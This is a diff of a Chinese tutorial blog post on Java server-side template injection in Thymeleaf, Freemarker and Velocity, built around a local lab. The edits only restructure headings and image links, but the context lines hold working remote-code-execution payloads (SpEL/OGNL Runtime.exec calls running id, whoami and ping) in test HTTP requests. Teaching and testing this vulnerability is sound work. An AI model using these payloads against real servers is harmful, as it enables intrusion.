@@ -85,13 +85,13 @@ Velocity:
 ```
 
 ## 5 例子
-### 5.1 概述
+## 5.1 概述
 
 ```plain
 本示例列举了Java代码审计中最基础的SSTI模版注入环境,读者们可以根据示例来学习该漏洞,并进行举一反三
 ```
 
-### 5.2 测试环境目录
+## 5.2 测试环境目录
 
 ```plain
 // 目录结构
@@ -125,7 +125,7 @@ Velocity:
 │ └── pom.xml
 ```
 
-### 5.3 修改pom.xml导入依赖
+## 5.3 修改pom.xml导入依赖
 
 ```xml
 在建好的项目下找到pom.xml文件并打开
@@ -199,8 +199,8 @@ Velocity:
 </dependency>
 ```
 
-### 5.4 Thymeleaf
-#### 5.4.1 常用POC
+## 5.4 Thymeleaf
+### 5.4.1 常用POC
 
 ```plain
 {% raw %}
@@ -229,7 +229,7 @@ aaa__${7*7}__bbb::x 响应包返回,aaa49bbb,表示有SSTI
 __${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::x
 ```
 
-#### 5.4.2 注意项
+### 5.4.2 注意项
 
 ```plain
 注意: 如果Web应用程序基于Spring那么Thymeleaf使用SpEL,否则Thymeleaf使用OGNL
@@ -239,7 +239,7 @@ SpEL: ${T(java.lang.Runtime).getRuntime().exec('id')}
 OGNL: ${#rr = @java.lang.Runtime@getRuntime(),#rr.exec("id")}
 ```
 
-#### 5.4.3 测试环境搭建
+### 5.4.3 测试环境搭建
 
 ```xml
 <!-- 第一步 -->
@@ -374,8 +374,8 @@ public class ThymeleafTest {
 </html>
 ```
 
-#### 5.4.4 漏洞测试
-##### 5.4.4.1 test路由
+### 5.4.4 漏洞测试
+#### 5.4.4.1 test路由
 
 ```plain
 // test路由,漏洞测试数据包,测试SSTI是否存在
@@ -388,7 +388,7 @@ Content-Length: 24
 path=aaa__${7*7}__bbb::x
 ```
 
-*（配图略）*
+![pasted image 20260618084238](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084238.png)
 
 
 
@@ -403,9 +403,9 @@ Content-Length: 24
 path=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::x
 ```
 
-*（配图略）*
+![pasted image 20260618084243](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084243.png)
 
-##### 5.4.4.2 test2路由
+#### 5.4.4.2 test2路由
 
 ```plain
 // test2路由,漏洞测试数据包
@@ -421,11 +421,11 @@ section=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("ping -
 // -c与-n，-c是linux的命令，-n是Windows的命令
 ```
 
-*（配图略）*
+![pasted image 20260618084251](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084251.png)
 
-*（配图略）*
+![pasted image 20260618084255](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084255.png)
 
-##### 5.4.4.3 test3路由
+#### 5.4.4.3 test3路由
 
 ```plain
 // test3路由,漏洞测试数据包
@@ -436,11 +436,11 @@ Connection: close
 
 ```
 
-*（配图略）*
+![pasted image 20260618084300](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084300.png)
 
-*（配图略）*
+![pasted image 20260618084305](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084305.png)
 
-##### 5.4.4.4 test4路由
+#### 5.4.4.4 test4路由
 
 ```plain
 // test4路由,漏洞测试数据包
@@ -453,10 +453,10 @@ Content-Length: 110
 data=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()).next()}__::x
 ```
 
-*（配图略）*
+![pasted image 20260618084315](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084315.png)
 
-##### 5.4.4.5 test5路由
-*（配图略）*
+#### 5.4.4.5 test5路由
+![pasted image 20260618084321](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084321.png)
 
 
 
@@ -472,7 +472,7 @@ Content-Length: 119
 data=<h3 th:text="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).next()}"></h3>
 ```
 
-*（配图略）*
+![pasted image 20260618084327](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084327.png)
 
 
 
@@ -483,10 +483,10 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-*（配图略）*
+![pasted image 20260618084337](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084337.png)
 
-### 5.5 Freemarker
-#### 5.5.1 常用POC
+## 5.5 Freemarker
+### 5.5.1 常用POC
 
 ```plain
 测试是否有SSTI:
@@ -522,7 +522,7 @@ ${ex("id")}
 </#list>
 ```
 
-#### 5.5.2 测试环境搭建
+### 5.5.2 测试环境搭建
 
 ```xml
 <!-- 第一步 -->
@@ -602,8 +602,8 @@ public class FreeMarkerTest {
 </html>
 ```
 
-#### 5.5.3 漏洞测试
-*（配图略）*
+### 5.5.3 漏洞测试
+![pasted image 20260618084355](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084355.png)
 
 
 ```plain
@@ -626,9 +626,9 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-*（配图略）*
+![pasted image 20260618084408](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084408.png)
 
-*（配图略）*
+![pasted image 20260618084414](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084414.png)
 
 
 
@@ -651,12 +651,12 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-*（配图略）*
+![pasted image 20260618084426](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084426.png)
 
-*（配图略）*
+![pasted image 20260618084432](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084432.png)
 
-### 5.6 Velocity
-#### 5.5.1 常用POC
+## 5.6 Velocity
+### 5.5.1 常用POC
 
 ```plain
 测试是否有SSTI:
@@ -675,7 +675,7 @@ Connection: close
 #end
 ```
 
-#### 5.6.2 测试环境搭建
+### 5.6.2 测试环境搭建
 
 ```xml
 <!-- 第一步 -->
@@ -758,8 +758,8 @@ public class VelocityTest {
 </html>
 ```
 
-#### 5.6.3 漏洞测试
-*（配图略）*
+### 5.6.3 漏洞测试
+![pasted image 20260618084444](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084444.png)
 
 
 
@@ -783,9 +783,9 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-*（配图略）*
+![pasted image 20260618084451](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084451.png)
 
-*（配图略）*
+![pasted image 20260618084455](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084455.png)
 
 
 
@@ -816,19 +816,19 @@ Host: 127.0.0.1:8081
 Connection: close
 ```
 
-*（配图略）*
+![pasted image 20260618084503](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084503.png)
 
-*（配图略）*
+![pasted image 20260618084509](/assets/img/posts/2026-07-20-ssti-template-injection/pasted-image-20260618084509.png)
 
 ## 6 特别致谢
-### 6.1 前言
+## 6.1 前言
 最终的成品文章,基本复制了以前网上大佬们的分享
 
 然后添加了一些例子,在此特别感谢大佬们,无私分享的精神!!!  
   
 谢谢!!!!!!
 
-### 6.2 参考文章
+## 6.2 参考文章
 https://forum.butian.net/share/1922
 
 http://drops.xmd5.com/static/drops/tips-8292.html
